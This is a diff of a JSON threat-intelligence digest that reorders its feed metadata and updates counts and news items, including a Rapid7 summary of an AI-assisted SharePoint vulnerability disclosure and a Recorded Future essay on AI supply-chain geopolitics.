@@ -1,13 +1,13 @@
 {
-  "generated_at": "2026-08-11T13:19:06.375957+00:00",
+  "generated_at": "2026-08-11T15:04:59.806816+00:00",
   "lookback_hours": 168,
   "lookback_human": "7 days",
   "total_feeds": 80,
   "feeds_ok": 75,
-  "total_items_in_window": 337,
-  "total_clusters_raw": 142,
-  "total_clusters_in_packet": 53,
-  "dropped_low_score": 89,
+  "total_items_in_window": 347,
+  "total_clusters_raw": 143,
+  "total_clusters_in_packet": 55,
+  "dropped_low_score": 88,
   "dropped_overflow": 0,
   "cohort_metadata": {
     "threat_research_primary": {
@@ -81,13 +81,6 @@
       "item_count": 15,
       "in_window_count": 5
     },
-    "Trend Micro Research": {
-      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 25,
-      "in_window_count": 0
-    },
     "SentinelOne Labs": {
       "url": "https://www.sentinelone.com/labs/feed/",
       "cohort": "threat_research_primary",
@@ -101,6 +94,13 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 7
+    },
+    "Trend Micro Research": {
+      "url": "https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 25,
+      "in_window_count": 0
     },
     "Google Threat Analysis Group": {
       "url": "https://blog.google/threat-analysis-group/rss/",
@@ -116,19 +116,12 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "Recorded Future": {
-      "url": "https://www.recordedfuture.com/feed",
-      "cohort": "threat_research_primary",
+    "NCSC UK": {
+      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
+      "cohort": "government_authoritative",
       "status": "ok",
-      "item_count": 50,
-      "in_window_count": 4
-    },
-    "Sekoia": {
-      "url": "https://blog.sekoia.io/feed/",
-      "cohort": "threat_research_primary",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Kaspersky Securelist": {
       "url": "https://securelist.com/feed/",
@@ -144,20 +137,6 @@
       "item_count": 10,
       "in_window_count": 3
     },
-    "Check Point Research": {
-      "url": "https://research.checkpoint.com/feed/",
-      "cohort": "threat_research_primary",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 2
-    },
-    "NCSC UK": {
-      "url": "https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml",
-      "cohort": "government_authoritative",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
     "SANS Internet Storm Center": {
       "url": "https://isc.sans.edu/rssfeed_full.xml",
       "cohort": "government_authoritative",
@@ -165,12 +144,12 @@
       "item_count": 10,
       "in_window_count": 9
     },
-    "Cisco Talos": {
-      "url": "https://feeds.feedburner.com/feedburner/Talos",
+    "Check Point Research": {
+      "url": "https://research.checkpoint.com/feed/",
       "cohort": "threat_research_primary",
       "status": "ok",
       "item_count": 15,
-      "in_window_count": 1
+      "in_window_count": 2
     },
     "ESET WeLiveSecurity": {
       "url": "https://www.welivesecurity.com/en/rss/feed/",
@@ -179,12 +158,19 @@
       "item_count": 100,
       "in_window_count": 1
     },
-    "Horizon3 Attack Research": {
-      "url": "https://horizon3.ai/feed/",
-      "cohort": "offensive_vulnerability_research",
+    "Recorded Future": {
+      "url": "https://www.recordedfuture.com/feed",
+      "cohort": "threat_research_primary",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
+      "item_count": 50,
+      "in_window_count": 5
+    },
+    "Cisco Talos": {
+      "url": "https://feeds.feedburner.com/feedburner/Talos",
+      "cohort": "threat_research_primary",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 1
     },
     "Volexity": {
       "url": "https://www.volexity.com/feed/",
@@ -193,26 +179,12 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Exploit-DB": {
-      "url": "https://www.exploit-db.com/rss.xml",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 4
-    },
-    "Red Canary": {
-      "url": "https://redcanary.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
-    },
-    "GitHub Security Lab": {
-      "url": "https://github.blog/category/security/feed/",
+    "Horizon3 Attack Research": {
+      "url": "https://horizon3.ai/feed/",
       "cohort": "offensive_vulnerability_research",
       "status": "ok",
       "item_count": 10,
-      "in_window_count": 1
+      "in_window_count": 3
     },
     "Assetnote": {
       "url": "https://www.assetnote.io/resources/research/rss.xml",
@@ -228,11 +200,32 @@
       "item_count": 40,
       "in_window_count": 3
     },
-    "Black Hills Information Security": {
-      "url": "https://www.blackhillsinfosec.com/feed/",
+    "Red Canary": {
+      "url": "https://redcanary.com/feed/",
       "cohort": "detection_response_operations",
-      "status": "parse_error",
-      "item_count": 0,
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
+    },
+    "GitHub Security Lab": {
+      "url": "https://github.blog/category/security/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 1
+    },
+    "Exploit-DB": {
+      "url": "https://www.exploit-db.com/rss.xml",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 50,
+      "in_window_count": 11
+    },
+    "watchTowr Labs": {
+      "url": "https://labs.watchtowr.com/rss/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 15,
       "in_window_count": 0
     },
     "The DFIR Report": {
@@ -242,11 +235,18 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "watchTowr Labs": {
-      "url": "https://labs.watchtowr.com/rss/",
-      "cohort": "offensive_vulnerability_research",
+    "Black Hills Information Security": {
+      "url": "https://www.blackhillsinfosec.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Proofpoint Threat Insight": {
+      "url": "https://www.proofpoint.com/us/rss.xml",
+      "cohort": "detection_response_operations",
       "status": "ok",
-      "item_count": 15,
+      "item_count": 10,
       "in_window_count": 0
     },
     "TrustedSec": {
@@ -255,13 +255,6 @@
       "status": "ok",
       "item_count": 10,
       "in_window_count": 2
-    },
-    "Proofpoint Threat Insight": {
-      "url": "https://www.proofpoint.com/us/rss.xml",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
     },
     "Active Countermeasures": {
       "url": "https://www.activecountermeasures.com/feed/",
@@ -291,12 +284,19 @@
       "item_count": 10,
       "in_window_count": 0
     },
-    "Rapid7": {
-      "url": "https://www.rapid7.com/blog/rss/",
-      "cohort": "offensive_vulnerability_research",
+    "Datadog Security Labs": {
+      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
+      "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
+      "item_count": 30,
+      "in_window_count": 0
+    },
+    "Sekoia": {
+      "url": "https://blog.sekoia.io/feed/",
+      "cohort": "threat_research_primary",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
     },
     "Orca Security Research": {
       "url": "https://orca.security/resources/blog/feed/",
@@ -305,19 +305,12 @@
       "item_count": 10,
       "in_window_count": 10
     },
-    "Datadog Security Labs": {
-      "url": "https://securitylabs.datadoghq.com/rss/feed.xml",
-      "cohort": "cloud_identity_infrastructure",
+    "Rapid7": {
+      "url": "https://www.rapid7.com/blog/rss/",
+      "cohort": "offensive_vulnerability_research",
       "status": "ok",
-      "item_count": 30,
-      "in_window_count": 0
-    },
-    "Permiso Security": {
-      "url": "https://permiso.io/blog/rss.xml",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 0
+      "item_count": 20,
+      "in_window_count": 3
     },
     "AWS Security Blog": {
       "url": "https://aws.amazon.com/blogs/security/feed/",
@@ -325,6 +318,13 @@
       "status": "ok",
       "item_count": 20,
       "in_window_count": 9
+    },
+    "Permiso Security": {
+      "url": "https://permiso.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 0
     },
     "Huntress": {
       "url": "https://www.huntress.com/blog/rss.xml",
@@ -340,9 +340,51 @@
       "item_count": 20,
       "in_window_count": 1
     },
+    "Cloudflare Security": {
+      "url": "https://blog.cloudflare.com/tag/security/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 0
+    },
     "Protect AI": {
       "url": "https://protectai.com/blog/rss.xml",
       "cohort": "ai_security_agentic_risk",
+      "status": "parse_error",
+      "item_count": 0,
+      "in_window_count": 0
+    },
+    "Sysdig": {
+      "url": "https://sysdig.com/feed/",
+      "cohort": "detection_response_operations",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
+    "Trail of Bits": {
+      "url": "https://blog.trailofbits.com/feed/",
+      "cohort": "offensive_vulnerability_research",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
+    },
+    "Cloudflare Radar": {
+      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 3
+    },
+    "Google DeepMind Blog": {
+      "url": "https://deepmind.google/blog/rss.xml",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 1
+    },
+    "Coveware": {
+      "url": "https://www.coveware.com/blog?format=rss",
+      "cohort": "ransomware_ecrime_financial_crime",
       "status": "parse_error",
       "item_count": 0,
       "in_window_count": 0
@@ -354,75 +396,12 @@
       "item_count": 100,
       "in_window_count": 3
     },
-    "Cloudflare Security": {
-      "url": "https://blog.cloudflare.com/tag/security/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 0
-    },
-    "Trail of Bits": {
-      "url": "https://blog.trailofbits.com/feed/",
-      "cohort": "offensive_vulnerability_research",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
-    },
-    "Sysdig": {
-      "url": "https://sysdig.com/feed/",
-      "cohort": "detection_response_operations",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
-    },
-    "Cloudflare Radar": {
-      "url": "https://blog.cloudflare.com/tag/cloudflare-radar/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
-    },
-    "Coveware": {
-      "url": "https://www.coveware.com/blog?format=rss",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "parse_error",
-      "item_count": 0,
-      "in_window_count": 0
-    },
-    "Google DeepMind Blog": {
-      "url": "https://deepmind.google/blog/rss.xml",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
-    },
     "Chainalysis": {
       "url": "https://www.chainalysis.com/blog/feed/",
       "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
       "item_count": 10,
       "in_window_count": 4
-    },
-    "OpenSSF Blog": {
-      "url": "https://openssf.org/feed/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 10,
-      "in_window_count": 3
-    },
-    "Google Cloud Security": {
-      "url": "https://cloudblog.withgoogle.com/rss/",
-      "cohort": "cloud_identity_infrastructure",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 20
-    },
-    "BleepingComputer": {
-      "url": "https://www.bleepingcomputer.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 15,
-      "in_window_count": 15
     },
     "Interconnects": {
       "url": "https://www.interconnects.ai/feed",
@@ -431,12 +410,19 @@
       "item_count": 20,
       "in_window_count": 2
     },
-    "GreyNoise": {
-      "url": "https://www.greynoise.io/blog/rss.xml",
+    "OpenSSF Blog": {
+      "url": "https://openssf.org/feed/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 2
+    },
+    "Google Cloud Security": {
+      "url": "https://cloudblog.withgoogle.com/rss/",
       "cohort": "cloud_identity_infrastructure",
       "status": "ok",
-      "item_count": 100,
-      "in_window_count": 0
+      "item_count": 20,
+      "in_window_count": 20
     },
     "The Record": {
       "url": "https://therecord.media/feed",
@@ -445,8 +431,29 @@
       "item_count": 5,
       "in_window_count": 5
     },
+    "BleepingComputer": {
+      "url": "https://www.bleepingcomputer.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 15,
+      "in_window_count": 15
+    },
     "SecurityWeek": {
       "url": "https://www.securityweek.com/feed/",
+      "cohort": "cyber_news_breach_reporting",
+      "status": "ok",
+      "item_count": 10,
+      "in_window_count": 10
+    },
+    "GreyNoise": {
+      "url": "https://www.greynoise.io/blog/rss.xml",
+      "cohort": "cloud_identity_infrastructure",
+      "status": "ok",
+      "item_count": 100,
+      "in_window_count": 0
+    },
+    "CyberScoop": {
+      "url": "https://cyberscoop.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
@@ -459,8 +466,15 @@
       "item_count": 20,
       "in_window_count": 1
     },
-    "CyberScoop": {
-      "url": "https://cyberscoop.com/feed/",
+    "Simon Willison": {
+      "url": "https://simonwillison.net/atom/everything/",
+      "cohort": "ai_security_agentic_risk",
+      "status": "ok",
+      "item_count": 30,
+      "in_window_count": 24
+    },
+    "Help Net Security": {
+      "url": "https://www.helpnetsecurity.com/feed/",
       "cohort": "cyber_news_breach_reporting",
       "status": "ok",
       "item_count": 10,
@@ -473,26 +487,12 @@
       "item_count": 50,
       "in_window_count": 20
     },
-    "Help Net Security": {
-      "url": "https://www.helpnetsecurity.com/feed/",
-      "cohort": "cyber_news_breach_reporting",
+    "Troy Hunt": {
+      "url": "https://www.troyhunt.com/rss/",
+      "cohort": "practitioner_analysis",
       "status": "ok",
-      "item_count": 10,
-      "in_window_count": 10
-    },
-    "Simon Willison": {
-      "url": "https://simonwillison.net/atom/everything/",
-      "cohort": "ai_security_agentic_risk",
-      "status": "ok",
-      "item_count": 30,
-      "in_window_count": 24
-    },
-    "Team Cymru": {
-      "url": "https://www.team-cymru.com/post/rss.xml",
-      "cohort": "ransomware_ecrime_financial_crime",
-      "status": "ok",
-      "item_count": 100,
-      "in_window_count": 1
+      "item_count": 15,
+      "in_window_count": 0
     },
     "Schneier on Security": {
       "url": "https://www.schneier.com/feed/atom/",
@@ -501,12 +501,12 @@
       "item_count": 10,
       "in_window_count": 7
     },
-    "Troy Hunt": {
-      "url": "https://www.troyhunt.com/rss/",
-      "cohort": "practitioner_analysis",
+    "Team Cymru": {
+      "url": "https://www.team-cymru.com/post/rss.xml",
+      "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
-      "item_count": 15,
-      "in_window_count": 0
+      "item_count": 100,
+      "in_window_count": 1
     },
     "Reddit r/cybersecurity": {
       "url": "https://www.reddit.com/r/cybersecurity/.rss",
@@ -515,13 +515,6 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "The Hacker News": {
-      "url": "https://feeds.feedburner.com/TheHackersNews",
-      "cohort": "cyber_news_breach_reporting",
-      "status": "ok",
-      "item_count": 50,
-      "in_window_count": 50
-    },
     "Krebs on Security": {
       "url": "https://krebsonsecurity.com/feed/",
       "cohort": "practitioner_analysis",
@@ -529,12 +522,19 @@
       "item_count": 10,
       "in_window_count": 1
     },
-    "Intel 471": {
-      "url": "https://intel471.com/blog/feed",
-      "cohort": "ransomware_ecrime_financial_crime",
+    "Reddit r/blueteamsec": {
+      "url": "https://www.reddit.com/r/blueteamsec/.rss",
+      "cohort": "reddit_practitioner_osint",
       "status": "ok",
-      "item_count": 100,
+      "item_count": 0,
       "in_window_count": 0
+    },
+    "Graham Cluley": {
+      "url": "https://grahamcluley.com/feed/",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 3
     },
     "Reddit r/sysadmin": {
       "url": "https://www.reddit.com/r/sysadmin/.rss",
@@ -543,8 +543,8 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Reddit r/blueteamsec": {
-      "url": "https://www.reddit.com/r/blueteamsec/.rss",
+    "Reddit r/netsecstudents": {
+      "url": "https://www.reddit.com/r/netsecstudents/.rss",
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 0,
@@ -564,19 +564,19 @@
       "item_count": 0,
       "in_window_count": 0
     },
-    "Reddit r/netsecstudents": {
-      "url": "https://www.reddit.com/r/netsecstudents/.rss",
-      "cohort": "reddit_practitioner_osint",
+    "The Hacker News": {
+      "url": "https://feeds.feedburner.com/TheHackersNews",
+      "cohort": "cyber_news_breach_reporting",
       "status": "ok",
-      "item_count": 0,
-      "in_window_count": 0
+      "item_count": 50,
+      "in_window_count": 50
     },
-    "Graham Cluley": {
-      "url": "https://grahamcluley.com/feed/",
-      "cohort": "practitioner_analysis",
+    "Intel 471": {
+      "url": "https://intel471.com/blog/feed",
+      "cohort": "ransomware_ecrime_financial_crime",
       "status": "ok",
-      "item_count": 20,
-      "in_window_count": 3
+      "item_count": 100,
+      "in_window_count": 1
     },
     "Infosecurity Magazine": {
       "url": "https://www.infosecurity-magazine.com/rss/news/",
@@ -590,14 +590,7 @@
       "cohort": "reddit_practitioner_osint",
       "status": "ok",
       "item_count": 25,
-      "in_window_count": 19
-    },
-    "tl;dr sec": {
-      "url": "https://tldrsec.com/feed.xml",
-      "cohort": "practitioner_analysis",
-      "status": "ok",
-      "item_count": 20,
-      "in_window_count": 1
+      "in_window_count": 20
     },
     "Embrace the Red": {
       "url": "https://embracethered.com/blog/index.xml",
@@ -605,6 +598,13 @@
       "status": "ok",
       "item_count": 100,
       "in_window_count": 0
+    },
+    "tl;dr sec": {
+      "url": "https://tldrsec.com/feed.xml",
+      "cohort": "practitioner_analysis",
+      "status": "ok",
+      "item_count": 20,
+      "in_window_count": 1
     },
     "Risky Business News": {
       "url": "https://risky.biz/feeds/risky-business-news/",
@@ -678,7 +678,7 @@
         "link": "https://www.rapid7.com/blog/post/etr-cve-2026-63520-microsoft-sharepoint-remote-code-execution-fixed",
         "published": "2026-08-11T13:00:00+00:00",
         "summary": "Overview Rapid7 Labs conducted a zero-day research project against Microsoft SharePoint, resulting in the discovery of two new vulnerabilities that, when chained together, achieve unauthenticated remote code execution (RCE) against a vulnerable SharePoint server. Today, both Rapid7 and Microsoft are disclosing the second vulnerability in this chain, the RCE vulnerability CVE-2026-63520. The first vulnerability in the chain, CVE-2026-55040, was disclosed by Rapid7 and Microsoft last month. Our full disclosure timeline for the exploit chain can be seen below in Figure 1. Figure 1: The road to disclosure. ⠀ CVE-2026-63520 affects all supported versions of Microsoft SharePoint, and certain versions of Microsoft Project Server and Microsoft Office Web Apps Server. For the purpose of our research, we focused solely on SharePoint. An attacker can leverage CVE-2026-63520 to execute arbitrary code on a vulnerable SharePoint server with the privileges of the SharePoint Site’s service account. Th",
-        "full_body": "Back to Blog Vulnerabilities and Exploits CVE-2026-63520: Microsoft SharePoint Remote Code Execution (FIXED) Stephen Fewer Aug 11, 2026 | Last updated on Aug 11, 2026 | 8 min read DISCOVER RAPID7 MDR Overview Rapid7 Labs conducted a zero-day research project against Microsoft SharePoint, resulting in the discovery of two new vulnerabilities that, when chained together, achieve unauthenticated remote code execution (RCE) against a vulnerable SharePoint server. Today, both Rapid7 and Microsoft are disclosing the second vulnerability in this chain, the RCE vulnerability CVE-2026-63520. The first vulnerability in the chain, CVE-2026-55040, was disclosed by Rapid7 and Microsoft last month. Our full disclosure timeline for the exploit chain can be seen below in Figure 1. Figure 1: The road to disclosure. ⠀ CVE-2026-63520 affects all supported versions of Microsoft SharePoint, and certain versions of Microsoft Project Server and Microsoft Office Web Apps Server. For the purpose of our research, we focused solely on SharePoint. An attacker can leverage CVE-2026-63520 to execute arbitrary code on a vulnerable SharePoint server with the privileges of the SharePoint Site’s service account. The vulnerability is due to an unsafe .NET type instantiation issue within the Business Connectivity Services . CVE-2026-63520 has a CVSSv3.1 score of 8.1 (High) , and a Common Weakness Enumeration (CWE) of CWE-20: Improper Input Validation . While the severity of the RCE is described as high, chained together with CVE-2026-55040 it becomes part of a critical unauthenticated RCE exploit chain against SharePoint. The exploit chain was developed as an entry for this year's Pwn2Own Berlin hacking competition; while our entry was unsuccessful on the day of the competition, this research highlights Rapid7 Labs' continued effort to raise the bar in Vulnerability Intelligence and our commitment to the preemptive protection of our customers through original vulnerability research. Our research methodology focused on understanding how publicly available AI models can assist in the discovery of significant vulnerabilities against proprietary enterprise targets. Our results established that the rate of model advancement is significantly accelerating vulnerability research, model guidance from subject matter experts is a force multiplier, and complex proprietary targets are easily handled through agentic workflows. Rapid7 is hosting a webinar on Thursday August 13, 2026 to discuss the research and findings for CVE-2026-55040 and CVE-2026-63520. Please join Douglas McKee and Stephen Fewer to learn more about this body of work. Workflow For this research project we wanted to understand the capabilities and limits of publicly available LLMs circa January through to March of this year. We wanted to answer the question if an AI workflow could find and develop an unauthenticated RCE exploit against a hard target such as SharePoint. This research project concluded with the successful discovery and development of such a chain. To that end, the publicly available models at the beginning of this year were indeed capable. This is notable as the rate of model improvement from Q1 of 2026 through to today has been significant. Our team's later testing of the most recent frontier models confirms the significant increase in capabilities from that of the beginning of this year. Our primary conclusion from the SharePoint research project in Q1 is that an agent guided by a subject matter expert (SME) was crucial to keep moving the model and its work towards the end goal. Given our current experience of frontier model capabilities, the need for an SME to verify and guide a model is lessened, but the compounding impact an SME can bring remains. Our first sprint in January did not result in any significant findings, rather, this sprint helped us establish the workflow and tooling that proved most useful, scope out the extremely large attack surface, and integrate prior work into our pr",
+        "full_body": "Back to Blog Vulnerabilities and Exploits CVE-2026-63520: Microsoft SharePoint Remote Code Execution (FIXED) Stephen Fewer Aug 11, 2026 | Last updated on Aug 11, 2026 | 8 min read REGISTER FOR THE WEBINAR Overview Rapid7 Labs conducted a zero-day research project against Microsoft SharePoint, resulting in the discovery of two new vulnerabilities that, when chained together, achieve unauthenticated remote code execution (RCE) against a vulnerable SharePoint server. Today, both Rapid7 and Microsoft are disclosing the second vulnerability in this chain, the RCE vulnerability CVE-2026-63520. The first vulnerability in the chain, CVE-2026-55040, was disclosed by Rapid7 and Microsoft last month. Our full disclosure timeline for the exploit chain can be seen below in Figure 1. Figure 1: The road to disclosure. ⠀ CVE-2026-63520 affects all supported versions of Microsoft SharePoint, and certain versions of Microsoft Project Server and Microsoft Office Web Apps Server. For the purpose of our research, we focused solely on SharePoint. An attacker can leverage CVE-2026-63520 to execute arbitrary code on a vulnerable SharePoint server with the privileges of the SharePoint Site’s service account. The vulnerability is due to an unsafe .NET type instantiation issue within the Business Connectivity Services . CVE-2026-63520 has a CVSSv3.1 score of 8.1 (High) , and a Common Weakness Enumeration (CWE) of CWE-20: Improper Input Validation . While the severity of the RCE is described as high, chained together with CVE-2026-55040 it becomes part of a critical unauthenticated RCE exploit chain against SharePoint. The exploit chain was developed as an entry for this year's Pwn2Own Berlin hacking competition; while our entry was unsuccessful on the day of the competition, this research highlights Rapid7 Labs' continued effort to raise the bar in Vulnerability Intelligence and our commitment to the preemptive protection of our customers through original vulnerability research. Our research methodology focused on understanding how publicly available AI models can assist in the discovery of significant vulnerabilities against proprietary enterprise targets. Our results established that the rate of model advancement is significantly accelerating vulnerability research, model guidance from subject matter experts is a force multiplier, and complex proprietary targets are easily handled through agentic workflows. Rapid7 is hosting a webinar on Thursday August 13, 2026 to discuss the research and findings for CVE-2026-55040 and CVE-2026-63520. Please join Douglas McKee and Stephen Fewer to learn more about this body of work. Workflow For this research project we wanted to understand the capabilities and limits of publicly available LLMs circa January through to March of this year. We wanted to answer the question if an AI workflow could find and develop an unauthenticated RCE exploit against a hard target such as SharePoint. This research project concluded with the successful discovery and development of such a chain. To that end, the publicly available models at the beginning of this year were indeed capable. This is notable as the rate of model improvement from Q1 of 2026 through to today has been significant. Our team's later testing of the most recent frontier models confirms the significant increase in capabilities from that of the beginning of this year. Our primary conclusion from the SharePoint research project in Q1 is that an agent guided by a subject matter expert (SME) was crucial to keep moving the model and its work towards the end goal. Given our current experience of frontier model capabilities, the need for an SME to verify and guide a model is lessened, but the compounding impact an SME can bring remains. Our first sprint in January did not result in any significant findings, rather, this sprint helped us establish the workflow and tooling that proved most useful, scope out the extremely large attack surface, and integrate prior work into o",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
@@ -1222,7 +1222,7 @@
     {
       "cluster_id": "61004037ea",
       "priority_score": 25,
-      "member_count": 11,
+      "member_count": 12,
       "corroborating_source_count": 9,
       "strong_signals": [
         "GitHub",
@@ -1576,10 +1576,10 @@
         {
           "source": "Infosecurity Magazine",
           "cohort": "cyber_news_breach_reporting",
-          "title": "ChainDrop Worm Hits 400+ npm Packages with Two Billion Monthly Installs",
-          "link": "https://www.infosecurity-magazine.com/news/chaindrop-worm-400-npm-two-billion/",
-          "published": "2026-08-05T10:00:00+00:00",
-          "summary": "A new npm worm has compromised packages with over two billion monthly installs",
+          "title": "Six npm Packages Read C2 Addresses From Ethereum Wallet",
+          "link": "https://www.infosecurity-magazine.com/news/npm-packages-ethereum-wallet-c2/",
+          "published": "2026-08-11T15:00:00+00:00",
+          "summary": "Six npm packages queried an Ethereum wallet to locate C2 infrastructure",
           "taxonomy": {
             "threat_categories": [],
             "actor_attribution": [],
@@ -1976,6 +1976,237 @@
       ]
     },
     {
+      "cluster_id": "4ea810dc8f",
+      "priority_score": 18,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "apt_espionage",
+          "supply_chain"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "manufacturing_industrial"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_1_primary_research"
+        ]
+      },
+      "primary": {
+        "source": "Recorded Future",
+        "cohort": "threat_research_primary",
+        "title": "Mines, Minds, and Machines: The Journey of AI",
+        "link": "https://www.recordedfuture.com/blog/mines-minds-machines",
+        "published": "2026-08-11T00:00:00+00:00",
+        "summary": "Minerals become chips. Chips become data centers. Data centers become models, and models are acquiring arms and legs. From Earth to Embodied AI traces the supply chain of the fourth industrial revolution, and shows how geopolitical rivalry and cyber operations now run along every link, from mine to machine.",
+        "full_body": "Mines, Minds, and Machines: The Journey of AI Minerals become chips. Chips supply data centers. Data centers power the training of models, and models are acquiring arms and legs. Mines, Minds, and Machines traces the supply chain of the fourth industrial revolution, and shows how geopolitical rivalry and cyber operations now run along every link. The Backdrop The world has fractured into competing spheres of influence, and the powers that are now fighting it out have concluded that the fourth industrial revolution will crown its own winners. History offers a blunt lesson on this point: China has learned the hard way that the nation that integrates new technology into its economy first wins: Britain harnessed the power of steam and ruled for a century; America maximized the use of steel and electricity, then silicon. One of the main technologies in question this time is artificial intelligence, specifically its final form, embodied AI, which is essentially physical intelligence with cameras, motors, and hands. Figure 1: Image showing how humanoid robotics aims to copy the human body (Source: Morgan Stanley ) The journey from Earth to embodiment follows a chain: minerals become chips; chips fill data centers; data centers provide the compute power to train models; and models become the brains of the machines. Just take a look at NVIDIA Isaac , for example. Each link in that chain is now a theater of geopolitical competition, and each is being probed, quietly and persistently, by state-sponsored and criminal hackers. For security leaders, understanding this journey we are on is more important than ever. The Mines Let’s start with the minerals. Rare earth elements, a family of seventeen metals, are used in small quantities but determine the efficiency, precision, and reliability of advanced equipment. Critical elements such as lithium, copper, nickel, cobalt, and graphite are consumed in bulk and form the physical backbone of batteries, wiring, and digital infrastructure. In simple terms, critical elements build the systems; rare earths enable them to function. These minerals are not mere commodities; they are increasingly becoming strategic dependencies for nations. Beijing’s foresight in this area is now paying dividends. China's leverage stems less from what it digs up than from what it refines: over 90% of the world's rare earth elements are processed there, and refining capacity is slow and expensive to replicate. China has increasingly demonstrated what its leverage buys. In 2025, it threatened to suspend rare earth exports to America, and Washington duly backed away from plans to restrict the transfer of critical semiconductor technology. The American response has been a scramble of stockpiling, domestic mining investment, and attempts to assemble critical minerals trade blocs with allies. Figure 2: Where critical elements and rare earths are mined or located (Source: Recorded Future ) The next scramble for critical minerals is moving beyond familiar territory. With the easiest deposits already claimed, competition is pushing into harder, colder, deeper, and more politically awkward places. Japan has recovered rare earths from 6,000 meters beneath the Pacific; Washington has ordered a rapid scaling of seabed mining capability; Arctic ice has lost more than 70% of its volume since the 1980s, exposing deposits and shipping lanes; Greenland holds 25 of the European Commission's 34 designated critical raw materials; and China and Russia are expanding their presence in Antarctica, where mining is off-limits but only until 2048. Space is next on the prospectus. We need to start looking at all of these theaters more than ever. This quest for minerals is accompanied by cyber-enabled battles. Insikt Group has linked infrastructure associated with a state-sponsored group to the targeting of a Canadian base-metals miner, and, in 2025, identified state actors targeting an organization that monitors and regulates seabed mining, just as ",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "supply_chain",
+            "apt_espionage"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "manufacturing_industrial"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_1_primary_research",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Recorded Future",
+          "cohort": "threat_research_primary",
+          "title": "Mines, Minds, and Machines: The Journey of AI",
+          "link": "https://www.recordedfuture.com/blog/mines-minds-machines",
